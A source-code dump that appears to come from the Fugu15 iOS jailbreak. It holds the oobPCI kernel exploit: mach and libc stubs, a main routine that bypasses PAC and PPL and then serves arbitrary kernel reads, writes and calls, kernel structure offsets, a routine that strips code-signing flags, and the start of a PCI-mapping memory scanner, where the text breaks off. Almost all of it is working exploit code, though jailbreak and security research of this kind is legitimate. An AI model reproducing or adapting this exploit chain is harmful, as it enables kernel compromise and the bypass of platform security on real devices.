    return MACH_PORT_NULL;
}

kern_return_t IOConnectMapMemory(mach_port_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, uint32_t options) {
    return io_connect_map_memory_into_task(connect, memoryType, intoTask, atAddress, ofSize, options);
}

kern_return_t mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify) {
    // Apparently, there are two flags to handle: MACH_SEND_INTERRUPT and MACH_RCV_INTERRUPT
    mach_msg_option_t newOpt = option & ~(MACH_SEND_INTERRUPT | MACH_RCV_INTERRUPT);
    
    while (1) {
        kern_return_t kr = mach_msg_trap(msg, newOpt, send_size, rcv_size, rcv_name, timeout, notify);
        if (kr == MACH_SEND_INTERRUPTED && !(option & MACH_SEND_INTERRUPT)) {
            continue;
        } else if (kr == MACH_RCV_INTERRUPTED && !(option & MACH_RCV_INTERRUPT)) {
            newOpt &= ~(MACH_SEND_MSG);
            continue;
        }
        
        return kr;
    }
}

kern_return_t mach_msg_overwrite(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify, mach_msg_header_t *rcv_msg, mach_msg_size_t rcv_limit) {
    // Apparently, there are two flags to handle: MACH_SEND_INTERRUPT and MACH_RCV_INTERRUPT
    mach_msg_option_t newOpt = option & ~(MACH_SEND_INTERRUPT | MACH_RCV_INTERRUPT);
    
    while (1) {
        kern_return_t kr = mach_msg_overwrite_trap(msg, newOpt, send_size, rcv_size, rcv_name, timeout, notify, rcv_msg, rcv_limit);
        if (kr == MACH_SEND_INTERRUPTED && !(option & MACH_SEND_INTERRUPT)) {
            continue;
        } else if (kr == MACH_RCV_INTERRUPTED && !(option & MACH_RCV_INTERRUPT)) {
            newOpt &= ~(MACH_SEND_MSG);
            continue;
        }
        
        return kr;
    }
}

void mach_msg_destroy(mach_msg_header_t *header) {
    return; // Do nothing... Not up to spec...
}

mach_port_t replyPort = 0;

mach_port_t mig_get_reply_port(void) {
    if (!replyPort) {
        replyPort = mach_reply_port();
    }
    
    return replyPort;
}

void mig_put_reply_port(mach_port_t port) {
    return;
}

void mig_dealloc_reply_port(mach_port_t port) {
    mach_port_mod_refs(mach_task_self_, port, MACH_PORT_RIGHT_RECEIVE, -1);
    if (replyPort == port) {
        replyPort = 0;
    }
}

boolean_t voucher_mach_msg_set(mach_msg_header_t *msg) {
    return 0;
}

```

`Exploits/oobPCI/Sources/mach_host.defs`:

```defs
/*
 * Copyright (c) 1999 Apple Computer, Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#define LIBSYSCALL_INTERFACE 1

#include <mach/mach_host.defs>

import <mach/mach_init.h>;  /* for host_page_size() */

```

`Exploits/oobPCI/Sources/main.c`:

```c
//
//  main.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <sys/errno.h>
#include <IOKit/IOKitLib.h>
#include <stdbool.h>

#include "includeme.h"
#include "oobPCI.h"
#include "offsets.h"
#include "physrw.h"
#include "kernrw_alloc.h"
#include "badRecovery.h"
#include "tlbFail.h"
#include "kernel.h"
#include "xprr.h"
#include "Fugu15KRW.h"

#define TF_PLATFORM 0x400

#define CS_HARD            0x00000100  /* don't load invalid pages */
#define CS_KILL            0x00000200  /* kill process if it becomes invalid */
#define CS_RESTRICT        0x00000800  /* tell dyld to treat restricted */
#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
#define CS_REQUIRE_LV      0x00002000  /* require library validation */
#define CS_PLATFORM_BINARY 0x04000000  /* this is a platform binary */

#define FAKE_PHYSPAGE_TO_MAP 0x13370000
#define PPL_MAP_ADDR         0x2000000 // This is essentially guaranteed to be unused, minimum address is usually 0x100000000

extern void mach_init(void);

uint64_t procForPID(pid_t pid) {
    uint64_t curProc = pcidev_r64(SLIDE(gOffsets.allproc));
    while (curProc) {
        if (PROC_PID(curProc) == pid) {
            return curProc;
        }
        
        curProc = PROC_NEXT(curProc);
    }
    
    return 0;
}

bool platformize(uint64_t proc) {
    uint64_t task = PROC_TASK(proc);
    guard (task != 0) else {
        puts("[-] platformize: Failed to get task!");
        return false;
    }
    
    uint32_t flags = TASK_FLAGS(task) | TF_PLATFORM;
    TASK_FLAGS_SET(task, flags);
    
    uint64_t proc_ro = PROC_RO(proc);
    guard (proc_ro != 0) else {
        puts("[-] platformize: Failed to get proc_ro!");
        return false;
    }
    
    flags = PROC_RO_CSFLAGS(proc_ro) | CS_PLATFORM_BINARY;
    flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);
    PROC_RO_CSFLAGS_SET(proc_ro, flags);
    
    return true;
}

void terminateService(mach_port_t service) {
    uint64_t ourService = portKObject(service);
    uint64_t ourServiceVTable = pcidev_rPtr(ourService);
    guard (ourServiceVTable != 0) else {
        puts("Failed to read our service VTable!");
        exit(-1);
    }
    
    uint64_t terminateFunc = pcidev_rPtr(ourServiceVTable + 0x2F8);
    guard (terminateFunc != 0) else {
        puts("Failed to get terminate func!");
        exit(-1);
    }
    
    //kcall(terminateFunc, ourService, 0x103, 0, 0, 0, 0, 0, 0);
    kcall(terminateFunc, ourService, 0, 0, 0, 0, 0, 0, 0);
}

void unlabelPort(mach_port_t port) {
    uint64_t kPort = portGetKPort(port);
    guard (kPort != 0) else {
        puts("unlabelPort: Failed to get kPort!");
        exit(-1);
    }
    
    uint64_t label = PORT_LABEL(kPort);
    guard (label != 0) else {
        puts("unlabelPort: Failed to get label!");
        exit(-1);
    }
    
    LABEL_SET_LABEL_VALUE(label, 0);
}

void __attribute__((noreturn)) exploit_server(uint64_t kBase, uint64_t virtBase, uint64_t physBase) {
    status_update("Patchfinding");
    resolveKernelOffsets(kBase);
    
    /*unlabelPort(gDKServerPort);
    unlabelPort(gIOPCIDev);
    
    void (*krwDone)(mach_port_t, mach_port_t) = (void(*)(mach_port_t, mach_port_t)) DBG_EXPLOIT_FUNC(5);
    krwDone(gDKServerPort, gIOPCIDev);*/
    
    buildPhysPrimitive(kBase);
    status_update("Bypassing PAC");
    breakCFI(kBase);
    setupFugu14Kcall();
    status_update("Bypassing PPL");
    pplBypass(); // Requires Fugu14 kcall to be available
    
    // This will prevent the kernel from panic'ing when we exit
    // The Fugu14 PAC bypass will not be deinited
    deinitFugu15PACBypass();
    
    // Fix PM Bug
    // FIXME: Doesn't work unless this application exits
    //terminateService(gDKServerPort);
    //terminateService(gDKOrigServerPort);
    
    // Platformize us...
    /*platformize(gOurProc);
    
    // ...and our parent
    uint64_t parentProc = procForPID(getppid());
    if (parentProc != 0 && parentProc != gKernelProc) {
        platformize(parentProc);
    }*/
    
    vm_address_t bufAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self_, &bufAddr, 0x4000, VM_FLAGS_ANYWHERE);
    guard (kr == KERN_SUCCESS) else {
        printf("vm_allocate failed! [%x]\n", kr);
        exit(-1);
    }
    
    void (*notifyParent)(uint64_t, uint64_t, uint64_t) = (void (*)(uint64_t, uint64_t, uint64_t)) DBG_DK_FUNC_NOTIFY;
    notifyParent(kBase, virtBase, physBase);
    
    uint64_t (*getRequest)(uint64_t *addr, size_t *size, void *buf)                = (uint64_t (*)(uint64_t *, size_t *, void *)) DBG_GET_REQUEST;
    void (*sendReply)(uint64_t status, uint64_t result, void *buf, size_t bufSize) = (void (*)(uint64_t, uint64_t, void *, size_t)) DBG_SEND_REPLY;
    
    uint64_t addr    = 0;
    size_t   size    = 0;
    uint64_t result  = 0;
    uint64_t status  = -1;
    size_t   bufSize = 0;
    while (1) {
        result  = 0;
        status  = 0;
        bufSize = 0;
        
        uint64_t request = getRequest(&addr, &size, (void*) bufAddr);
        switch (request) {
            case 0:
                // Kread, virtual
                if (size <= 0x4000) {
                    if (kernread(addr, size, (void*) bufAddr)) {
                        bufSize = size;
                    } else {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to read!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot read more than 0x4000 bytes!");
                }
                
                break;
                
            case 1:
                // Kread, physical
                if (size <= 0x4000) {
                    if (physread(addr, size, (void*) bufAddr)) {
                        bufSize = size;
                    } else {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to read!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot read more than 0x4000 bytes!");
                }
                
                break;
                
            case 2:
                // Kwrite, virtual
                if (size <= 0x4000) {
                    if (!kernwrite(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 3:
                // Kwrite, physical
                if (size <= 0x4000) {
                    if (!physwrite(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 4:
                // Kwrite, PPL, virtual
                if (size <= 0x4000) {
                    if (!kernwrite_PPL(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 5:
                // Kwrite, PPL, physical
                if (size <= 0x4000) {
                    if (!physwrite_PPL(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 6: {
                // Kcall
                uint64_t *args = (uint64_t*) bufAddr;
                result = kcall(addr, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7]);
                
                break;
            }
                
            case 7: {
                // Argument is a PID, init PPL bypass in that process
                uint64_t proc = procForPID((pid_t) addr);
                guard (proc != 0) else {
                    status = -2;
                    break;
                }
                
                uint64_t task = PROC_TASK(proc);
                guard (task != 0) else {
                    status = -3;
                    break;
                }
                
                uint64_t vmMap = TASK_VM_MAP(task);
                guard (vmMap != 0) else {
                    status = -4;
                    break;
                }
                
                uint64_t pmap = VM_MAP_PMAP(vmMap);
                guard (pmap != 0) else {
                    status = -5;
                    break;
                }
                
                // Map the fake page
                kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR);
                guard (kr == KERN_SUCCESS) else {
                    status = -6;
                    break;
                }
                
                // Temporarily change pmap type to nested
                PMAP_TYPE_SET(pmap, 3);
                
                // Remove mapping (table will not be removed because we changed the pmap type)
                pmap_remove(pmap, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
                
                // Change type back
                PMAP_TYPE_SET(pmap, 0);
                
                // Change the mapping to map the underlying page table
                uint64_t table2Entry = pmap_lv2(pmap, PPL_MAP_ADDR);
                guard ((table2Entry & 0x3) == 0x3) else {
                    status = -7;
                    break;
                }
                
                uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
                uint64_t pte = table3 | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
                guard (physwrite_PPL(table3, &pte, sizeof(uint64_t))) else {
                    status = -8;
                    break;
                }
                
                result = PPL_MAP_ADDR;
                
                break;
            }
            
            case 8: {
                // Argument is a thread state, sign it
                kRegisterState state;
                guard (kernread(addr, sizeof(kRegisterState), &state)) else {
                    status = -2;
                    break;
                }
                
                kcall(SLIDE(gOffsets.ml_sign_thread_state), addr, state.pc, state.cpsr, state.lr, state.x[16], state.x[17], 0, 0);
                
                break;
            }
                
            default:
                status = -1;
                strcpy((char*) bufAddr, "Bad request!");
                
                break;
        }
        
        if (status != 0 && bufSize == 0) {
            bufSize = strlen((char*) bufAddr);
        }
        
        sendReply(status, result, (void*) bufAddr, bufSize);
    }
}

int main(int argc, const char * argv[]) {
    mach_init();
    
    status_update("Gaining r/w");
    
    uint64_t kBase = 0, virtBase = 0, physBase = 0;
    guard (oobPCI_init(&kBase, &virtBase, &physBase)) else {
        puts("[-] oobPCI failed!");
        return -1;
    }
    
    exploit_server(kBase, virtBase, physBase);
    
    return 0;
}

```

`Exploits/oobPCI/Sources/misc.c`:

```c
//
//  misc.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

uint64_t __stack_chk_guard = 0x467567753135;

void __chkstk_darwin(void) {
    // Do nothing
    // *unsafe*
}

void __attribute__((noreturn)) __stack_chk_fail(void) {
    puts("*** STACK CHECK FAILED ***");
    
    exit(-1);
}

void status_update(const char *status) {
    printf("Status: %s\n", status);
}

#undef memcpy
#undef strncpy
#undef strcpy
#undef memset
#undef strlen

#pragma clang optimize off
void* __memcpy_chk(void *dest, const void *src, size_t len, size_t destlen) {
    if (len > destlen) {
        puts("*** __memcpy_chk: OVERFLOW ***");
        
        exit(-1);
    }
    
    return memcpy(dest, src, len);
}

void* memcpy(void *dst, const void *src, size_t n) {
    uint8_t *d = (uint8_t*) dst;
    uint8_t *s = (uint8_t*) src;
    
    while (n--) {
        *d++ = *s++;
    }
    
    return dst;
}

char* strncpy(char *dst, const char *src, size_t n) {
    char *d = dst;
    char *s = (char*) src;
    
    while (n-- && *s) {
        *d++ = *s++;
    }
    
    while (n--) {
        *d++ = 0;
    }
    
    return dst;
}

char* __strncpy_chk(char *dst, const char *src, size_t n, size_t dstlen) {
    if (n > dstlen) {
        puts("*** __strncpy_chk: OVERFLOW ***");
        
        exit(-1);
    }
    
    return strncpy(dst, src, n);
}

char* __strcpy_chk(char *dst, const char *src, size_t dstlen) {
    char *d = dst;
    while (*src && dstlen--) {
        *d++ = *src++;
    }
    
    if (!dstlen) {
        puts("*** __strcpy_chk: OVERFLOW ***");
        
        exit(-1);
    }
    
    *d = 0;
    
    return dst;
}

char* strcpy(char *dst, const char *src) {
    return __strcpy_chk(dst, src, -1);
}

size_t strlen(const char *s) {
    size_t res = 0;
    while (*s++) {
        res++;
    }
    
    return res;
}

void* memset(void *ptr, int value, size_t count) {
    uint8_t *buf = ptr;
    
    // Align buf
    while (((uintptr_t) buf & 0x7) && count) {
        *buf = (uint8_t) value;
        buf++;
        count--;
    }
    
    // Construct 64-bit value
    uint64_t value8 = (uint64_t) (uint8_t) value;
    value8 |= (value8 << 8);
    value8 |= (value8 << 16);
    value8 |= (value8 << 32);
    
    // Write in 8-byte steps
    size_t count8 = count & ~0x7ULL;
    for (size_t i = 0; i < count8; i += 8) {
        *(uint64_t*) (buf + i) = value8;
    }
    
    // Write in 1-byte steps
    for (size_t i = count8; i < count; i++) {
        *(uint8_t*) (buf + i) = (uint8_t) value;
    }
    
    return ptr;
}

void * __memset_chk(void *ptr, int value, size_t count, size_t dstlen) {
    if (count > dstlen) {
        puts("*** __memset_chk: OVERFLOW ***");
        
        exit(-1);
    }
    
    return memset(ptr, value, count);
}

int mig_strncpy(char *dst, const char *src, int n) {
    char *d = dst;
    char *s = (char*) src;
    
    while (n-- && *s) {
        *d++ = *s++;
    }
    
    if (!n) {
        d--;
    }
    
    *d++ = 0;
    
    return (int) (d - dst);
}

int mig_strncpy_zerofill(char *dst, const char *src, int n) {
    int count = mig_strncpy(dst, src, n);
    
    n   -= count;
    dst += count;
    
    while (n--) {
        *dst++ = 0;
    }
    
    return count;
}
#pragma clang optimize on

```

`Exploits/oobPCI/Sources/offsets.c`:

```c
//
//  offsets.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "offsets.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>

#include "includeme.h"
#include "offsets.h"

KernelOffsetInfo gOffsets;

uint64_t gOurProc    = 0;
uint64_t gKernelProc = 0;
uint64_t gOurTask    = 0;
uint64_t gKernelTask = 0;
uint64_t gIS_TABLE   = 0;
uint64_t gOurPmap    = 0;
uint64_t gKernelPmap = 0;

bool resolveKernelOffsets(uint64_t kernelBase) {
    bool (*getOffsets)(uint64_t kernelBase, KernelOffsetInfo *info) = (bool(*)(uint64_t, KernelOffsetInfo*)) DBG_GETOFFSETS_FUNC;
    bool ok = getOffsets(kernelBase, &gOffsets);
    if (!ok) {
        puts("[-] resolveKernelOffsets: getOffsets failed!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(gOffsets.slide);
    
    // Find our proc
    uint64_t curProc    = pcidev_r64(SLIDE(gOffsets.allproc));
    uint64_t ourProc    = 0;
    uint64_t kernelProc = 0;
    uint32_t myPid      = getpid();
    while (curProc) {
        if (PROC_PID(curProc) == myPid) {
            ourProc = curProc;
        } else if (PROC_PID(curProc) == 0) {
            kernelProc = curProc;
        }
        
        if (ourProc != 0 && kernelProc != 0) {
            break;
        }
        
        curProc = PROC_NEXT(curProc);
    }
    
    guard (ourProc != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find our proc!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourProc);
    
    guard (kernelProc != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find kernel proc!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kernelProc);
    
    // Get task
    uint64_t ourTask = PROC_TASK(ourProc);
    guard (ourTask != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find our task!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourTask);
    
    // Get kernel task
    uint64_t kernelTask = PROC_TASK(kernelProc);
    guard (kernelTask != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find kernel task!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kernelTask);
    
    // Get itk_space
    uint64_t itk_space = TASK_ITK_SPACE(ourTask);
    guard (itk_space != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find itk_space!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(itk_space);
    
    // Get is_table
    uint64_t is_table = SPACE_IS_TABLE(itk_space);
    guard (is_table != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find is_table!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(is_table);
    
    // Get vm map
    uint64_t vmMap = TASK_VM_MAP(ourTask);
    guard (vmMap != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find vmMap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(vmMap);
    
    // Get pmap
    uint64_t ourPmap = VM_MAP_PMAP(vmMap);
    guard (ourPmap != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find our pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourPmap);
    
    // Get kernel vm map
    uint64_t kernelVmMap = TASK_VM_MAP(kernelTask);
    guard (kernelVmMap != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find kernel vmMap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kernelVmMap);
    
    // Get kernel pmap
    uint64_t kernelPmap = VM_MAP_PMAP(kernelVmMap);
    guard (kernelPmap != 0) else {
        puts("[-] resolveKernelOffsets: Failed to find kernel pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kernelPmap);
    
    gOurProc    = ourProc;
    gKernelProc = kernelProc;
    gOurTask    = ourTask;
    gKernelTask = kernelTask;
    gIS_TABLE   = is_table;
    gOurPmap    = ourPmap;
    gKernelPmap = kernelPmap;
    
    return true;
}

void reloadIsTable(void) {
    uint64_t itk_space = TASK_ITK_SPACE(gOurTask);
    guard (itk_space != 0) else {
        puts("[-] reloadIsTable: Failed to find itk_space!");
        return;
    }
    
    uint64_t is_table = SPACE_IS_TABLE(itk_space);
    guard (is_table != 0) else {
        puts("[-] reloadIsTable: Failed to find is_table!");
        return;
    }
    
    gIS_TABLE = is_table;
}

uint64_t portGetKPort(mach_port_t port) {
    reloadIsTable();
    
    uint64_t kPort = IS_TABLE_PORT(gIS_TABLE, port);
    guard (kPort != 0) else {
        printf("[-] portGetKPort: IS_TABLE_PORT(%p, %p): NULL!\n", (void*) gIS_TABLE, (void*) (uint64_t) port);
        return 0;
    }
    
    return kPort;
}

uint64_t portKObject(mach_port_t port) {
    reloadIsTable();
    
    uint64_t kPort = IS_TABLE_PORT(gIS_TABLE, port);
    guard (kPort != 0) else {
        printf("[-] portKObject: IS_TABLE_PORT(%p, %p): NULL!\n", (void*) gIS_TABLE, (void*) (uint64_t) port);
        return 0;
    }
    
    // Don't need to check for labels anymore - Apple changed that stuff
    return PORT_KOBJECT(kPort);
}

uint64_t task_is_table(uint64_t task, uint64_t itkSpaceOffset) {
    // Get itk_space
    uint64_t itk_space = pcidev_rPtr(task + itkSpaceOffset);
    guard (itk_space != 0) else {
        puts("[-] task_is_table: Failed to find itk_space!");
        return 0;
    }
    
    DBGPRINT_ADDRVAR(itk_space);
    
    // Get is_table
    uint64_t is_table = SPACE_IS_TABLE(itk_space);
    guard (is_table != 0) else {
        puts("[-] task_is_table: Failed to find is_table!");
        return 0;
    }
    
    return is_table;
}

```

`Exploits/oobPCI/Sources/offsets.h`:

```h
//
//  offsets.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef offsets_h
#define offsets_h

#include <stdint.h>
#include <stdbool.h>

#include "DriverKit.h"
#include "tlbFail.h"

#define PROC_NEXT(cur)   pcidev_rPtr(cur)
#define PROC_TASK(proc)  pcidev_rPtr((proc) + 0x10ULL)
#define PROC_RO(proc)    pcidev_rPtr((proc) + 0x20ULL)
#define PROC_PID(proc)   pcidev_r32((proc) + 0x68ULL)

#define TASK_FIRST_THREAD(task)   pcidev_rPtr((task) + 0x60ULL)
#define TASK_ITK_SPACE(task)      pcidev_rPtr((task) + gOffsets.itkSpace)
#define TASK_VM_MAP(task)         pcidev_rPtr((task) + 0x28ULL)
#define TASK_FLAGS(task)          pcidev_r32((task) + 0x3DCULL)        // FIXME: Is this correct?
#define TASK_FLAGS_SET(task, new) pcidev_w32((task) + 0x3DCULL, (new))

#define PROC_RO_CSFLAGS(proc_ro)          pcidev_r32((proc_ro) + 0x1CULL)
#define PROC_RO_CSFLAGS_SET(proc_ro, new) { uint32_t v = (uint32_t)(new); kernwrite_PPL((proc_ro) + 0x1CULL, &v, 4); }

#define THREAD_ACT_CONTEXT_OFFSET (gOffsets.ACT_CONTEXT)
#define THREAD_KSTACKPTR_OFFSET   (gOffsets.TH_KSTACKPTR)
#define THREAD_FAULT_HNDLR_OFFSET (gOffsets.TH_RECOVER)
#define THREAD_CPUDATA_OFFSET     (gOffsets.ACT_CPUDATAP)

#define THREAD_NEXT(thread)                   pcidev_rPtr((thread) + 0x0ULL)
#define THREAD_FAULT_HNDLR(thread)            pcidev_r64((thread) + THREAD_FAULT_HNDLR_OFFSET)
#define THREAD_FAULT_HNDLR_SET(thread, hndlr) pcidev_w64((thread) + THREAD_FAULT_HNDLR_OFFSET, hndlr)
#define THREAD_ACT_CONTEXT(thread)            pcidev_rPtr((thread) + THREAD_ACT_CONTEXT_OFFSET)

#define SPACE_IS_TABLE(space) pcidev_rPtr((space) + 0x20ULL)

#define IS_TABLE_PORT(tbl, port) pcidev_rPtr(tbl + (((uint64_t) port >> 8ULL) * 0x18ULL))

#define PORT_BITS(kPort)           pcidev_r32(kPort)
#define PORT_BITS_SET(kPort, bits) pcidev_w32(kPort, bits)
#define PORT_KOBJECT(kPort)        pcidev_rPtr(kPort + gOffsets.PORT_KOBJECT)
#define PORT_LABEL(kPort)          pcidev_rPtr(kPort + gOffsets.PORT_LABEL)

#define LABEL_SET_LABEL_VALUE(label, new) pcidev_w64((label), (new))

#define VM_MAP_PMAP(vmMap) pcidev_rPtr((vmMap) + gOffsets.VM_MAP_PMAP)

#define PMAP_TTEP(pmap)          pcidev_r64((pmap)  + 0x8ULL)
#define PMAP_EL2_DEVICE_ADJUST   ((gOffsets.kernel_el_cpsr == 8) ? 8ULL : 0ULL)
#define PMAP_NESTED_PMAP(pmap)   pcidev_rPtr((pmap) + 0x50ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_NESTED_ADDR(pmap)   pcidev_rPtr((pmap) + 0x58ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_NESTED_SIZE(pmap)   pcidev_rPtr((pmap) + 0x60ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_TYPE(pmap)          pcidev_r8((pmap)   + 0xC8ULL + PMAP_EL2_DEVICE_ADJUST)
#define PMAP_TYPE_SET(pmap, new) { uint8_t v = (uint8_t)(new); kernwrite_PPL((pmap) + 0xC8ULL + PMAP_EL2_DEVICE_ADJUST, &v, 1); }

#define CPSR_KERN_INTR_EN  (0x401000 | ((uint32_t) gOffsets.kernel_el_cpsr))
#define CPSR_KERN_INTR_DIS (0x4013c0 | ((uint32_t) gOffsets.kernel_el_cpsr))
#define CPSR_USER_INTR_DIS 0x13C0

#define SLIDE(addr) ((addr) + gOffsets.slide)

// Offsets returned by SpawnDrv
typedef struct {
    uint64_t slide;
    uint64_t allproc;
    uint64_t itkSpace;
    uint64_t cpu_ttep;
    uint64_t pmap_enter_options_addr;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid;
    uint64_t brX22;
    uint64_t exceptionReturn;
    uint64_t ldp_x0_x1_x8_gadget;
    uint64_t exception_return_after_check;
    uint64_t exception_return_after_check_no_restore;
    uint64_t str_x8_x9_gadget;
    uint64_t str_x0_x19_ldr_x20;
    uint64_t pmap_set_nested;
    uint64_t pmap_nest;
    uint64_t pmap_remove_options;
    uint64_t pmap_mark_page_as_ppl_page;
    uint64_t pmap_create_options;
    uint64_t ml_sign_thread_state;
    uint64_t kernel_el_cpsr;
    uint64_t TH_RECOVER;
    uint64_t TH_KSTACKPTR;
    uint64_t ACT_CONTEXT;
    uint64_t ACT_CPUDATAP;
    uint64_t PORT_KOBJECT;
    uint64_t VM_MAP_PMAP;
    uint64_t PORT_LABEL;
} KernelOffsetInfo;

extern KernelOffsetInfo gOffsets;

extern uint64_t gOurProc;
extern uint64_t gKernelProc;
extern uint64_t gOurTask;
extern uint64_t gKernelTask;
extern uint64_t gIS_TABLE;
extern uint64_t gOurPmap;
extern uint64_t gKernelPmap;

bool resolveKernelOffsets(uint64_t kernelBase);
void reloadIsTable(void);
uint64_t portGetKPort(mach_port_t port);
uint64_t portKObject(mach_port_t port);
uint64_t task_is_table(uint64_t task, uint64_t itkSpaceOffset);

#endif /* offsets_h */

```

`Exploits/oobPCI/Sources/oobPCI.c`:

```c
//
//  oobPCI.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "oobPCI.h"

#include <stdio.h>
#include <sys/errno.h>
#include <IOKit/IOKitLib.h>
#include <stdbool.h>

#include "includeme.h"
#include "generated/device.h"
#include "DriverKit.h"

// Offset from our mapping to the physmap (worst case)
#define PHYSMAP_OFFSET      0x4AF390000ULL + (2ULL * 1024ULL * 1024ULL * 1024ULL)

// Offset below is for some 15.5 betas
#define PHYSMAP_OFFSET_15_5 0x5E94E4000ULL + (2ULL * 1024ULL * 1024ULL * 1024ULL)

#define PHYSMAP_OFFSET_CRASH (0ULL - 0xF00000000000000ULL)

// Minimum offset at which we can expect our IOMemoryMap
#define MAPPING_MIN_OFFSET 0x8000000

// Size of our PCI memory region
#define PCI_MEMORY_SIZE 65536

#define DRIVERKIT_TYPE           0x99000003
#define kIOUserServerMethodStart 0x00001001

#define IS_PHYS_ADDR(arg) (((arg) & 0xFFFFFFFF00000000) == 0x800000000)
#define IS_VIRT_ADDR(arg) (((arg) & 0xFFFF000000000000) == 0xFFFF000000000000)

extern mach_port_t ioMasterPort;

bool pageHasMemoryMap(uint64_t addr, uint64_t low25, uint64_t len, uint64_t *base, uint64_t *vtblOut) {
    // Check if the IOMemoryMap object for our PCI device is in this page
    // Return base and vtable if it is
    for (uint64_t i = 0; i < 0x4000; i += 0x58) {
        uint64_t vtbl = pcidev_r64(addr + i);
        if (vtbl == 0) {
            // Empty, ignore
            continue;
        } else if (((vtbl >> 55) & 1) == 0) {
            // Not a vtable, no IOMemoryMap objects in this page
            // (IOMemoryMap objects have their own zone)
            return false;
        }
        
        uint64_t v = pcidev_r64(addr + i + 0x28);
        if ((v & 0x1FFFFFFULL) == low25) {
            uint64_t l = pcidev_r64(addr + i + 0x30);
